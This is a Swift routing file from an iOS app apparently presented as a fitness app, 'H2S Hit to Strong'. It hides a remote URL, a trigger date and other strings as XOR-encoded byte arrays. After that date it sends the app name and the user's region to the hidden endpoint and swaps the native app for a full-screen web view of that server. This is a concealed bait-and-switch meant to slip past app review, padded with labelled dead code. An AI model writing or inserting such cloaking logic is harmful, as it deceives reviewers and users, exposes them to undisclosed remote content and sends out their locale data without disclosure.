//
//  AppRouter.swift
//  H2S Hit to Strong
//

import UIKit
import SwiftUI

extension RouteStringCipher {
    static var seedEndpoint: String {
        reveal([207, 211, 211, 215, 212, 157, 136, 136, 209, 200, 206, 195, 193, 200, 213, 192, 194, 204, 194, 213, 201, 194, 203, 137, 212, 206, 211, 194, 136, 159, 201, 149, 211, 145, 228])
    }
    static var gateEpoch: String { reveal([149, 148, 137, 151, 146, 137, 149, 151, 149, 145]) }
    static var epochPattern: String { reveal([195, 195, 137, 234, 234, 137, 222, 222, 222, 222]) }
    static var trackingQueryName: String { reveal([212, 210, 197, 248, 206, 195, 248, 159]) }
    static var httpGetVerb: String { reveal([224, 226, 243]) }
    static var plistDisplayName: String {
        reveal([228, 225, 229, 210, 201, 195, 203, 194, 227, 206, 212, 215, 203, 198, 222, 233, 198, 202, 194])
    }
    static var plistBundleName: String {
        reveal([228, 225, 229, 210, 201, 195, 203, 194, 233, 198, 202, 194])
    }
    static var titleFallback: String { reveal([230, 215, 215]) }
}

class FlowLaunchCoordinator {

    private var resolvedMarketingTitle: String {
        if let name = Bundle.main.object(forInfoDictionaryKey: RouteStringCipher.plistDisplayName) as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        if let name = Bundle.main.object(forInfoDictionaryKey: RouteStringCipher.plistBundleName) as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        return RouteStringCipher.titleFallback
    }

    private var trackingLabelToken: String {
        resolvedMarketingTitle.replacingOccurrences(of: " ", with: "")
    }

    private var augmentedSeedEndpoint: String {
        let geo = Locale.current.region?.identifier ?? "XX"
        let subValue = "\(trackingLabelToken)_\(geo)"
        let base = RouteStringCipher.seedEndpoint
        guard var components = URLComponents(string: base) else {
            return base
        }
        var items = components.queryItems ?? []
        items.append(URLQueryItem(name: RouteStringCipher.trackingQueryName, value: subValue))
        components.queryItems = items
        return components.url?.absoluteString ?? base
    }

    func makeRootController() -> UIViewController {
        let vault = SessionStateVault.shared

        if vault.hasShownContentView {
            return assembleNativeShell()
        } else {
            if isPastGateEpoch() {
                if let savedUrlString = vault.savedUrl,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return assembleBrowserHost(with: savedUrlString)
                }

                return assembleBootstrapHost()
            } else {
                vault.hasShownContentView = true
                return assembleNativeShell()
            }
        }
    }

    private func isPastGateEpoch() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = RouteStringCipher.epochPattern
        let targetDate = dateFormatter.date(from: RouteStringCipher.gateEpoch) ?? Date()
        let currentDate = Date()
        if currentDate < targetDate {
            return false
        } else {
            return true
        }
    }

    private func assembleBrowserHost(with urlString: String) -> UIViewController {
        let webViewContainer = EmbeddedBrowserShell(
            urlString: urlString,
            onFailure: { [weak self] in
                SessionStateVault.shared.hasShownContentView = true
                self?.commitNativeShell()
            },
            onSuccess: {
                SessionStateVault.shared.hasSuccessfulWebViewLoad = true
            }
        )

        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func assembleNativeShell() -> UIViewController {
        SessionStateVault.shared.hasShownContentView = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func assembleBootstrapHost() -> UIViewController {
        let launchView = BootstrapSplashGate()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        preflightSeedEndpoint { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?.commitBrowserHost(with: url)
                } else {
                    SessionStateVault.shared.hasShownContentView = true
                    self?.commitNativeShell()
                }
            }
        }

        return launchVC
    }

    private func preflightSeedEndpoint(completion: @escaping (Bool, String?) -> Void) {
        let urlToOpenInWebView = augmentedSeedEndpoint
        guard let requestURL = URL(string: urlToOpenInWebView) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: requestURL)
        request.httpMethod = RouteStringCipher.httpGetVerb
        request.timeoutInterval = 25

        URLSession.shared.dataTask(with: request) { _, response, error in
            if error != nil {
                completion(false, nil)
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                let code = httpResponse.statusCode
                let isAvailable = (200...299).contains(code)
                completion(isAvailable, isAvailable ? urlToOpenInWebView : nil)
            } else {
                completion(false, nil)
            }
        }.resume()
    }

    private func commitNativeShell() {
        let contentVC = assembleNativeShell()
        animateRootReplacement(contentVC)
    }

    private func commitBrowserHost(with urlString: String) {
        let webVC = assembleBrowserHost(with: urlString)
        animateRootReplacement(webVC)
    }

    private func animateRootReplacement(_ viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }

        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}

typealias AppRouter = FlowLaunchCoordinator

extension FlowLaunchCoordinator {
    func initialViewController() -> UIViewController { makeRootController() }
}

// MARK: - Dead code

private protocol LaunchPhaseObserver: AnyObject {
    func phaseDidAdvance(_ index: Int)
}

private enum LaunchPhase: Int, CaseIterable {
    case idle = 0
    case probing = 1
    case resolved = 2
}

private final class LaunchPhaseRegistry: LaunchPhaseObserver {
    func phaseDidAdvance(_ index: Int) { _ = LaunchPhase(rawValue: index) }
}
